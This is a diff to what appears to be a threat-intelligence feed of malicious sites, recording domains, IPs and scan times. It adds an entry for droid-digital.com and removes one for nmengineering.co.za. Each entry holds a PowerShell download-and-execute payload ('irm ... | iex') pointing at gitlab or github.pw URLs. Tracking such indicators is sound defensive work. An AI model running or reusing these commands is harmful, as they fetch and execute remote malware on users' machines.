@@ -1,5 +1,25 @@
 [
   {
+    "UrlDomain": "droid-digital.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "162.241.252.125"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881"
+    ],
+    "ReportId": "cmwh6rtfu0ot30omlftsxinhi",
+    "ScannedAt": "2026-11-15T01:59:05.218000+00:00"
+  },
+  {
     "UrlDomain": "ingenieriapyd.cl",
     "DeliveryUrl": [
       "softsyncizobrazie.net"
@@ -470,24 +490,5 @@
     ],
     "ReportId": "cmwg9lbgo0l4u0omlslp8xa75",
     "ScannedAt": "2026-11-14T10:30:14.635000+00:00"
-  },
-  {
-    "UrlDomain": "nmengineering.co.za",
-    "DeliveryUrl": [
-      "github.pw"
-    ],
-    "PayloadUrl": [
-      "https://github.pw/click/41422c4edd1735b5"
-    ],
-    "IP": [
-      "102.130.117.48"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://github[.]pw/click/41422c4edd1735b5')|iex",
-    "ResolvedDownloadUrl": [
-      "https://github.pw/click/41422c4edd1735b5"
-    ],
-    "ReportId": "cmwfqf7a40ivv0oml8u89k1od",
-    "ScannedAt": "2026-11-14T01:33:36.554000+00:00"
   }
 ]
